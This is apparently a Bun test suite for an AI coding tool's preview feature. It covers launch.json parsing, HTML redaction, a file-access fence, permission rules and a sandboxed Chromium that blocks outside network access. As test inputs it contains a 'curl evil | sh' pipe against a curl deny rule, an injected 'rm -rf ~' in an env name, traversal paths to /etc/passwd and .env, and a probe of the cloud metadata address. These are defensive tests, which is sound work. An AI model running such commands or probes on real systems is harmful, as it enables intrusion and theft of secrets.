/**
 * The Preview pane (browser/preview.ts, launch.ts, picker.ts): launch.json
 * parsing, the picker's trimming and redaction, the file fence, and in a live
 * Chromium the relay (only its own port, no hub cookies or auth, HMR's
 * WebSocket) and the browser's fence (no hub port, other loopback ports, LAN
 * or internet).
 *
 * The live part runs once per binary: a full Chromium (the hub's download or a
 * system Chrome) and the headless shell, when present, since they read the
 * WebRTC policy differently. CONCLAVE_PREVIEW_BROWSERS=<path>:<path> picks them.
 *
 *   bun test packages/core/test/browser/preview.test.ts
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ConfigStore } from '../../src/config';
import { BrowserManager, findBrowserExecutable, playwrightCacheDirs } from '../../src/browser';
import { createConnection } from 'node:net';
import { chooseConfig, launchLine, parseJsonc, parseLaunch, planLaunch, withPort } from '../../src/browser/launch';
import { MAX_HTML, bareUrl, cleanHtml, cleanPick, pickText } from '../../src/browser/picker';
import { PreviewConfirm, PreviewRelay, RELAY_MAX_SOCKETS, PreviewService, containedFile, previewTools } from '../../src/browser/preview';
import { LocalMachine } from '../../src/machine/local';
import { loopbackProcess } from '../../src/machine/connect';
import { checkPermission } from '../../src/session/permissions';
import { UNTRUSTED_DENY } from '../../src/tools';

describe('launch.json', () => {
  test('JSONC: comments and trailing commas; strings keep // and /*', () => {
    expect(parseJsonc('{ // c\n "a": "http://x/*y*/", /* b */ "b": [1,2,], }')).toEqual({ a: 'http://x/*y*/', b: [1, 2] });
  });

  test('configurations, bad entries as problems', () => {
    const { configs, problems } = parseLaunch(`{"configurations":[
      {"name":"web","runtimeExecutable":"npm","runtimeArgs":["run","dev","--","--port","3000"],"port":3000},
      {"name":"attach","url":"http://localhost:8080/app"},
      {"name":"nothing"},
      {"name":"low","runtimeExecutable":"x","port":80}]}`);
    expect(configs.map((c) => c.name)).toEqual(['web', 'attach']);
    expect(problems.length).toBe(2);
    expect(parseLaunch('nope').problems[0]).toContain('not valid JSON');
    expect(() => chooseConfig(configs, 'other')).toThrow('Names: web, attach');
    expect(chooseConfig(configs).name).toBe('web');
  });

  test('autoPort: a free port (PORT, --port, --port=, -p, -pN) only when port is unset or autoPort is true', () => {
    expect(withPort(['dev', '--port', '1', '--port=2', '-p', '3', '-p4', '--other', '5'], 4321)).toEqual(['dev', '--port', '4321', '--port=4321', '-p', '4321', '-p4321', '--other', '5']);
    const plan = planLaunch({ name: 'web', runtimeExecutable: 'npm', runtimeArgs: ['run', 'dev', '--port', '3000'], env: { A: '1' } }, 24567);
    expect(plan).toMatchObject({ command: 'npm', args: ['run', 'dev', '--port', '24567'], env: { A: '1', PORT: '24567' }, port: 24567, path: '/' });
    expect(plan.fixed).toBeUndefined();
    // the documented example: Vite's `npm run dev` on 5173 reads no PORT, so the set port is kept as it is
    expect(planLaunch({ name: 'web', runtimeExecutable: 'npm', runtimeArgs: ['run', 'dev'], port: 5173 }, 9999)).toMatchObject({ args: ['run', 'dev'], env: {}, port: 5173, fixed: true });
    expect(planLaunch({ name: 'web', runtimeExecutable: 'npm', runtimeArgs: ['--port', '3000'], port: 3000, autoPort: true }, 9999)).toMatchObject({ args: ['--port', '9999'], port: 9999 });
    expect(planLaunch({ name: 'web', runtimeExecutable: 'npm', runtimeArgs: ['--port', '3000'], port: 3000, autoPort: false }, 9999)).toMatchObject({ args: ['--port', '3000'], env: {}, port: 3000 });
  });

  test('launchLine: env, program and args as a shell would show them; odd env names dropped', () => {
    const { configs } = parseLaunch(JSON.stringify({ configurations: [{ name: 'w', runtimeExecutable: 'npm', runtimeArgs: ['run', 'dev', 'a b'], env: { NODE_OPTIONS: '--require ./x.js', 'X; rm -rf ~ #': 'y' } }, { name: 'u', url: 'http://localhost:8080/' }] }));
    expect(launchLine(configs[0])).toBe("NODE_OPTIONS='--require ./x.js' npm run dev 'a b'");
    expect(launchLine(configs[1])).toBe('http://localhost:8080/');
  });

  test('launchLine names the cwd, so a launch.json moved to another folder needs a new approval', () => {
    expect(launchLine({ name: 'w', runtimeExecutable: 'npm', runtimeArgs: ['run', 'dev'], cwd: 'apps/my web' })).toBe("cd 'apps/my web' && npm run dev");
    expect(launchLine({ name: 'w', runtimeExecutable: 'npm', runtimeArgs: ['run', 'dev'], cwd: 'apps/web' })).not.toBe(launchLine({ name: 'w', runtimeExecutable: 'npm', runtimeArgs: ['run', 'dev'], cwd: 'apps/evil' }));
  });

  test('url attaches to localhost only', () => {
    expect(planLaunch({ name: 'a', url: 'http://localhost:8080/app?x=1' })).toMatchObject({ port: 8080, path: '/app?x=1' });
    expect(() => planLaunch({ name: 'a', url: 'http://192.168.1.5:8080/' })).toThrow('only to http://localhost');
    expect(() => planLaunch({ name: 'a', url: 'http://localhost:22/' })).toThrow('port from 1024');
  });
});

describe('picker payload', () => {
  test('scripts out, secret-like values redacted, cut at 4096', () => {
    const html = `<div data-token="abc" title="ok" value="hunter2" data-k="${'a'.repeat(40)}" data-jwt="eyJhbGciOi.eyJzdWIi.sig"><script>steal()</script>hi</div>`;
    const out = cleanHtml(html);
    expect(out).toContain('title="ok"');
    expect(out).not.toContain('steal');
    expect(out).not.toContain('hunter2');
    expect(out).not.toContain('abc"');
    expect(out).not.toContain('eyJhbGciOi');
    expect(out).not.toContain('a'.repeat(40));
    expect(cleanHtml(`<p>${'x'.repeat(9000)}</p>`).length).toBeLessThan(MAX_HTML + 40);
  });

  test('url loses query and hash; source from data-source, else React; selector at most 10 parts', () => {
    expect(bareUrl('http://localhost:5/a?token=1#x')).toBe('http://localhost:5/a');
    const raw = { selector: Array.from({ length: 14 }, (_, i) => `div${i}`), html: '<b>x</b>', styles: { color: 'red', bogus: 'x' }, rect: { x: 1.4, y: 2, width: 3, height: 4 }, url: 'http://localhost:5/?q', attrs: { 'data-source': 'src/App.tsx:12' } };
    const p = cleanPick(raw, { file: 'src/Other.tsx', line: 3, components: ['Button', 'App'] });
    expect(p.selector.split(' > ').length).toBe(10);
    expect(p.source).toBe('src/App.tsx:12');
    expect(p.styles).toEqual({ color: 'red' });
    expect(p.rect.x).toBe(1);
    expect(cleanPick({ ...raw, attrs: {} }, { file: 'src/Other.tsx', line: 3, column: 7 }).source).toBe('src/Other.tsx:3:7');
    expect(pickText(p)).toContain('components: Button < App');
  });

  test('page-given source hints are capped: line and column only as numbers', () => {
    const raw = { selector: ['p'], html: '<p>x</p>', styles: {}, rect: { x: 0, y: 0, width: 1, height: 1 }, url: 'http://localhost:5/', attrs: {} };
    const p = cleanPick(raw, { file: 'f'.repeat(5000), line: 'x'.repeat(10_000_000) as never, column: {} as never, components: 'nope' as never });
    expect(p.source).toBe('f'.repeat(300));
    expect(p.components).toBeUndefined();
    expect(pickText(p).length).toBeLessThan(1000);
  });
});

describe('file fence', () => {
  let root: string;
  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), 'conclave-preview-files-'));
    mkdirSync(join(root, 'site/css'), { recursive: true });
    writeFileSync(join(root, 'site/index.html'), '<p>hi</p>');
    writeFileSync(join(root, 'secret.txt'), 'no');
    writeFileSync(join(root, 'site/.env'), 'KEY=1');
    mkdirSync(join(root, 'site/.git'));
    writeFileSync(join(root, 'site/.git/config'), '[core]');
    symlinkSync('/etc', join(root, 'site/etc'));
    symlinkSync(join(root, 'secret.txt'), join(root, 'site/link.txt'));
  });
  afterAll(() => rmSync(root, { recursive: true, force: true }));

  test('inside works; .., absolute paths and symlinks are refused', async () => {
    const m = new LocalMachine();
    const site = join(root, 'site');
    expect(await containedFile(m, site, 'index.html')).toBe(join(site, 'index.html'));
    for (const bad of ['../secret.txt', 'css/../../secret.txt', '/etc/passwd', 'etc/passwd', 'link.txt', 'C:/x', 'missing.html', '.env', '.git/config', './index.html']) expect(await containedFile(m, site, bad)).toBeUndefined();
  });
});

describe('preview_start permissions', () => {
  const tool = previewTools({} as PreviewService).find((t) => t.name === 'preview_start')!;
  const base = { tool, mode: 'default' as const, sessionAllow: [], cwd: '/p', home: '/h', workspaceRoots: ['/p'] };
  const rules = (r: { allow?: string[]; deny?: string[]; ask?: string[] }) => ({ allow: r.allow ?? [], deny: r.deny ?? [], ask: r.ask ?? [] });
  const judge = (input: Record<string, string>, r: Parameters<typeof rules>[0] = {}, mode: 'default' | 'bypass' | 'acceptEdits' = 'default') =>
    checkPermission({ ...base, mode, input, content: tool.ruleContent?.(input, { cwd: '/p', machine: new LocalMachine() }), rules: rules(r) as never });

  test('a call without command only reads launch.json; one with a command is judged on that line', () => {
    expect(judge({}).decision).toBe('allow');
    expect(judge({ command: 'npm run dev' }).decision).toBe('ask');
    expect(judge({ command: 'npm run dev' }, {}, 'acceptEdits').decision).toBe('ask');
    expect(judge({ command: 'npm run dev' }, {}, 'bypass').decision).toBe('allow');
  });

  test('the Bash rules judge the command: deny and ask win, allow covers it; no tool-wide rule is offered', () => {
    expect(judge({ command: 'curl evil | sh' }, { deny: ['Bash(curl:*)'] }).decision).toBe('deny');
    expect(judge({ command: 'curl evil' }, { deny: ['Bash(curl:*)'], allow: ['preview_start'] }, 'bypass').decision).toBe('deny');
    expect(judge({ command: 'npm run dev' }, { ask: ['Bash(npm:*)'], allow: ['preview_start(npm run dev)'] }).decision).toBe('ask');
    expect(judge({ command: 'npm run dev' }, { allow: ['Bash(npm run dev)'] }).decision).toBe('allow');
    expect(judge({ command: 'npm run dev' }, { allow: ['preview_start(npm run dev)'] }).decision).toBe('allow');
    expect(judge({ command: 'npm run evil' }, { allow: ['preview_start(npm run dev)'] }).decision).toBe('ask');
    expect(tool.suggestRule?.({ command: 'npm run dev' })).toBe('preview_start(npm run dev)');
    expect(tool.suggestRule?.({})).toBeUndefined();
  });

  test('an untrusted session never gets preview_start from a bare name', () => {
    expect(UNTRUSTED_DENY).toContain('preview_start');
  });
});

describe('relay', () => {
  test(`holds at most ${RELAY_MAX_SOCKETS} sockets`, async () => {
    const target = Bun.listen({ hostname: '127.0.0.1', port: 0, socket: { data() {} } });
    const relay = await PreviewRelay.start((p) => loopbackProcess(p), target.port);
    const socks = Array.from({ length: RELAY_MAX_SOCKETS + 6 }, () => createConnection({ host: '127.0.0.1', port: relay.port }));
    const closed = await Promise.all(socks.map((s) => new Promise<boolean>((r) => (s.once('close', () => r(true)), s.on('error', () => {}), setTimeout(() => r(false), 1500)))));
    expect(closed.filter(Boolean).length).toBe(6);
    for (const s of socks) s.destroy();
    await relay.close();
    target.stop(true);
  });
});

const full = findBrowserExecutable({ headless: false, extraDirs: ['/var/lib/conclave/browser/ms-playwright'] });
// shortcut: the Linux headless shell layout only, add others when a test machine needs them
const shell = playwrightCacheDirs()
  .flatMap((d) => {
    try {
      return readdirSync(d).filter((n) => n.startsWith('chromium_headless_shell-')).map((n) => join(d, n, 'chrome-headless-shell-linux64/chrome-headless-shell'));
    } catch {
      return [];
    }
  })
  .find((p) => existsSync(p));
const browsers = process.env.CONCLAVE_PREVIEW_BROWSERS?.split(':').filter(Boolean) ?? [...new Set([full, shell].filter((p): p is string => !!p))];
let hasPlaywright = true;
try {
  await import('playwright-core');
} catch {
  hasPlaywright = false;
}

/** A tiny app the session "runs": a page with an error, a fetch log and a WebSocket like HMR's. */
const APP = `
const seen = [];
Bun.serve({
  port: Number(process.env.PORT), hostname: '127.0.0.1',
  fetch(req, srv) {
    const u = new URL(req.url);
    if (u.pathname === '/hmr') return srv.upgrade(req) ? undefined : new Response('no', { status: 400 });
    seen.push({ path: u.pathname, cookie: req.headers.get('cookie'), auth: req.headers.get('authorization'), host: req.headers.get('host') });
    if (u.pathname === '/seen') return Response.json(seen);
    if (u.pathname === '/missing') return new Response('gone', { status: 404 });
    return new Response('<!doctype html><title>App</title><h1 data-source="src/App.tsx:7" style="color: rgb(200, 0, 0)">Hello preview</h1><script>console.error("boom from app")</script>', { headers: { 'content-type': 'text/html' } });
  },
  websocket: { message(ws, m) { ws.send('hmr:' + m); } },
});
`;

// no browser or no playwright-core: the live part does not run
for (const exe of hasPlaywright ? browsers : []) describe(`preview (live Chromium: ${exe})`, () => {
  let home: string;
  let app: string;
  let manager: BrowserManager;
  let service: PreviewService;
  let hub: ReturnType<typeof Bun.serve>;
  let other: ReturnType<typeof Bun.serve>;
  const hubHits: string[] = [];
  const sid = 'sess_preview';

  beforeAll(() => {
    home = mkdtempSync(join(tmpdir(), 'conclave-preview-'));
    app = join(home, 'app');
    mkdirSync(join(app, '.conclave'), { recursive: true });
    mkdirSync(join(app, '.claude'), { recursive: true });
    writeFileSync(join(app, 'server.ts'), APP);
    writeFileSync(join(app, 'page.html'), '<!doctype html><title>File</title><p id="f">from file</p><img src="https://example.com/x.png">');
    // .conclave wins over .claude
    writeFileSync(join(app, '.claude/launch.json'), JSON.stringify({ configurations: [{ name: 'wrong', runtimeExecutable: 'false' }] }));
    writeFileSync(join(app, '.conclave/launch.json'), `{ // the app\n "configurations": [{ "name": "web", "runtimeExecutable": "${process.execPath}", "runtimeArgs": ["server.ts"], }] }`);
    // stands in for the hub and another loopback service: the preview must not reach either
    hub = Bun.serve({ port: 0, hostname: '127.0.0.1', fetch: (r) => (hubHits.push(new URL(r.url).pathname), new Response('hub')) });
    other = Bun.serve({ port: 0, hostname: '127.0.0.1', fetch: (r) => (hubHits.push(`other${new URL(r.url).pathname}`), new Response('other')) });
    // CONCLAVE_PREVIEW_HUB_BROWSER=<CloakBrowser chrome>: a hub whose browser and profile are CloakBrowser still previews (and logs) on stock Chromium
    const cloak = process.env.CONCLAVE_PREVIEW_HUB_BROWSER;
    const config = new ConfigStore(home, { browser: cloak ? { headless: true, executablePath: cloak, profiles: { default: { engine: 'cloak' } }, cloak: { executablePath: cloak } } : { headless: true, executablePath: exe } });
    // the preview runs on this binary, not the first one the hub would find
    manager = new BrowserManager({ config, stockBrowser: () => exe });
    service = new PreviewService(manager, () => [hub.port as number]);
  });

  afterAll(async () => {
    await service?.closeAll();
    await manager?.close();
    hub?.stop(true);
    other?.stop(true);
    rmSync(home, { recursive: true, force: true });
  });

  test('launch.json runs only with its exact line (or in a trusted folder)', async () => {
    const err = await service.start(sid, new LocalMachine(), app).catch((e) => e);
    expect(err).toBeInstanceOf(PreviewConfirm);
    expect((err as PreviewConfirm).line).toBe(`${process.execPath} server.ts`);
    expect(service.state(sid).running).toBe(false);
    await expect(service.start(sid, new LocalMachine(), app, { command: 'false' })).rejects.toThrow('now runs');
    expect(service.state(sid).running).toBe(false);
  });

  test('a fixed port that already answers, or the hub\'s port, is refused', async () => {
    const dir = join(home, 'busy');
    mkdirSync(join(dir, '.conclave'), { recursive: true });
    writeFileSync(join(dir, '.conclave/launch.json'), JSON.stringify({ configurations: [{ name: 'fake', runtimeExecutable: 'sleep', runtimeArgs: ['30'], port: other.port }, { name: 'hub', url: `http://localhost:${hub.port}/` }] }));
    await expect(service.start(sid, new LocalMachine(), dir, { trusted: true })).rejects.toThrow('already answers');
    await expect(service.start(sid, new LocalMachine(), dir, { name: 'hub', trusted: true })).rejects.toThrow("hub's own ports");
    expect(service.state(sid).running).toBe(false);
    expect(hubHits).toEqual([]);
  }, 30_000);

  test('two starts at once leave one preview; a stop during startup ends it', async () => {
    const spawned: number[] = [];
    class Spy extends LocalMachine {
      override spawn(...a: Parameters<LocalMachine['spawn']>) {
        const p = super.spawn(...a);
        spawned.push(p.pid ?? 0);
        return p;
      }
    }
    const spy = new Spy();
    const results = await Promise.allSettled([service.start(sid, spy, app, { trusted: true }), service.start(sid, spy, app, { trusted: true })]);
    expect(results.filter((r) => r.status === 'fulfilled').length).toBe(1);
    await Bun.sleep(300);
    const alive = spawned.filter((pid) => { try { process.kill(pid, 0); return true; } catch { return false; } });
    expect(alive.length).toBe(1);
    // a stop while the next start waits for its server
    const starting = service.start(sid, spy, app, { trusted: true });
    await Bun.sleep(50);
    await service.stop(sid);
    await expect(starting).rejects.toThrow();
    await Bun.sleep(300);
    expect(spawned.filter((pid) => { try { process.kill(pid, 0); return true; } catch { return false; } }).length).toBe(0);
    expect(service.state(sid).running).toBe(false);
  }, 60_000);

  test('starts the launch.json server and shows it through the relay', async () => {
    const st = await service.start(sid, new LocalMachine(), app, { command: `${process.execPath} server.ts` });
    expect(st).toMatchObject({ running: true, name: 'web', server: 'running' });
    expect(st.url).toMatch(/^http:\/\/localhost:\d+\/$/);
    const page = await manager.page(sid);
    await page.waitForSelector('h1');
    expect(await page.textContent('h1')).toBe('Hello preview');
  }, 60_000);

  test('the page reaches only its relay: not the hub, other loopback ports, the LAN or the internet', async () => {
    const page = await manager.page(sid);
    const tries = await page.evaluate(async (urls: string[]) => {
      const out: Record<string, string> = {};
      for (const u of urls) out[u] = await fetch(u, { signal: AbortSignal.timeout(4000) }).then((r) => `ok ${r.status}`, (e) => `blocked ${e.name}`);
      return out;
    }, [`http://127.0.0.1:${hub.port}/api/info`, `http://localhost:${hub.port}/api/info`, `http://127.0.0.1:${other.port}/`, 'http://192.168.1.1/', 'http://169.254.169.254/latest/meta-data', 'https://example.com/', '/seen']);
    for (const [u, r] of Object.entries(tries)) expect({ u, r: r.split(' ')[0] }).toEqual({ u, r: u === '/seen' ? 'ok' : 'blocked' });
    expect(hubHits).toEqual([]);
    const logs = service.logs(sid);
    expect(logs.some((e) => e.kind === 'blocked' && e.text.includes(String(hub.port)))).toBe(true);
    expect(logs.some((e) => e.kind === 'console' && e.text.includes('boom from app'))).toBe(true);
  }, 30_000);

  test('no UDP leaves: WebRTC STUN and WebTransport reach nothing; DNS resolves only localhost', async () => {
    const got: string[] = [];
    const udp = await Bun.udpSocket({ hostname: '127.0.0.1', port: 0, socket: { data: (_s, buf) => void got.push(String(buf.length)) } });
    const page = await manager.page(sid);
    const out = await page.evaluate(async (port: number) => {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${port}` }, { urls: `turn:127.0.0.1:${port}?transport=udp`, username: 'u', credential: 'c' }] });
      const cands: string[] = [];
      pc.onicecandidate = (e) => e.candidate && cands.push(e.candidate.candidate);
      pc.createDataChannel('x');
      await pc.setLocalDescription(await pc.createOffer());
      await new Promise((r) => setTimeout(r, 2500));
      pc.close();
      let wt = 'none';
      if (typeof (globalThis as { WebTransport?: unknown }).WebTransport === 'function') {
        const t = new (globalThis as unknown as { WebTransport: new (u: string) => { ready: Promise<void> } }).WebTransport(`https://127.0.0.1:${port}/`);
        wt = await Promise.race([t.ready.then(() => 'open', () => 'failed'), new Promise<string>((r) => setTimeout(() => r('timeout'), 2000))]);
      }
      return { cands, wt };
    }, udp.port);
    await Bun.sleep(300);
    udp.close();
    expect(got).toEqual([]);
    expect(out.wt).not.toBe('open');
    expect(out.cands.filter((c) => / (srflx|relay) /.test(c))).toEqual([]);
    // a name other than localhost does not resolve (dns-prefetch, preconnect); the fence logs nothing new for it
    expect(await page.evaluate(() => fetch('http://example.com/').then(() => 'ok', () => 'blocked'))).toBe('blocked');
  }, 30_000);

  test('log URLs are capped', async () => {
    const page = await manager.page(sid);
    // well past the 300 cap but under the app server's header limit: at 200k Bun answers 431 and closes
    // mid-upload, so Chrome saw a 431 or a reset by timing and the 'response' line was sometimes missing
    await page.evaluate(() => fetch('/missing?' + 'a'.repeat(10_000)).catch(() => {}));
    // the response event lands after fetch settles; under a loaded runner (parallel files) that can take a while
    for (let i = 0; i < 50 && !service.logs(sid).some((e) => e.kind === 'response'); i++) await Bun.sleep(100);
    const long = service.logs(sid).filter((e) => e.kind === 'response');
    expect(long.length).toBeGreaterThan(0);
    for (const e of long) expect((e.url ?? '').length).toBeLessThanOrEqual(301);
  }, 30_000);

  test('no hub cookie or auth reaches the app; HMR WebSocket works through the relay', async () => {
    const page = await manager.page(sid);
    const echoed = await page.evaluate(
      () =>
        new Promise<string>((done, fail) => {
          const ws = new WebSocket(`ws://${location.host}/hmr`);
          ws.onopen = () => ws.send('ping');
          ws.onmessage = (m) => done(String(m.data));
          ws.onerror = () => fail(new Error('ws failed'));
        }),
    );
    expect(echoed).toBe('hmr:ping');
    const seen = (await page.evaluate(() => fetch('/seen').then((r) => r.json()))) as Array<{ cookie: string | null; auth: string | null; host: string }>;
    expect(seen.length).toBeGreaterThan(0);
    for (const s of seen) {
      expect(s.cookie).toBeNull();
      expect(s.auth).toBeNull();
      // the Host the browser sent passes through: Vite's and Next's host checks see localhost
      expect(s.host).toMatch(/^localhost(:\d+)?$/);
    }
    // a 404 shows in the log
    await page.evaluate(() => fetch('/missing'));
    await Bun.sleep(200);
    expect(service.logs(sid).some((e) => e.kind === 'response' && e.status === 404)).toBe(true);
  }, 30_000);

  test('pick: the element, its styles, its source and a crop', async () => {
    const r = await service.pick(sid, 30, 30);
    expect(r.pick.selector).toContain('h1');
    expect(r.pick.source).toBe('src/App.tsx:7');
    expect(r.pick.styles.color).toBe('rgb(200, 0, 0)');
    expect(r.pick.url).toMatch(/^http:\/\/localhost:\d+\/$/);
    expect(r.image && Buffer.from(r.image, 'base64').subarray(1, 4).toString()).toBe('PNG');
  }, 30_000);

  test('navigate refuses other addresses; view sets size and theme', async () => {
    await expect(service.navigate(sid, 'https://example.com/')).rejects.toThrow('only its own');
    await service.view(sid, { width: 390, colorScheme: 'dark' });
    const page = await manager.page(sid);
    expect(page.viewportSize()?.width).toBe(390);
    expect(await page.evaluate(() => matchMedia('(prefers-color-scheme: dark)').matches)).toBe(true);
  }, 30_000);

  test('an HTML file comes from the session folder only; stop ends the server', async () => {
    await service.start(sid, new LocalMachine(), app, { file: 'page.html' });
    const page = await manager.page(sid);
    await page.waitForSelector('#f');
    expect(page.url()).toBe('http://preview.invalid/page.html');
    const outside = await page.evaluate(() => fetch('/../server.ts').then((r) => r.status));
    expect(outside).toBe(200); // the browser folds "/../" to "/server.ts", which is inside
    expect(await page.evaluate(() => fetch('/.conclave/../../etc/passwd').then((r) => r.status))).toBe(404);
    // a bad escape is answered (404), not left hanging; dotfiles are never served
    expect(await page.evaluate(() => fetch('/%E0.html', { signal: AbortSignal.timeout(4000) }).then((r) => r.status, () => 0))).toBe(404);
    expect(await page.evaluate(() => fetch('/.conclave/launch.json').then((r) => r.status))).toBe(404);
    // the file's CSP stops outside loads before the fence even sees them
    expect(await page.evaluate(() => fetch('https://example.com/').then(() => 'ok', () => 'blocked'))).toBe('blocked');
    await expect(service.start(sid, new LocalMachine(), app, { file: '../x.html' })).rejects.toThrow('not a file inside');
    await service.stop(sid);
    expect(service.state(sid).running).toBe(false);
    expect(manager.previewing(sid)).toBe(false);
  }, 60_000);
});
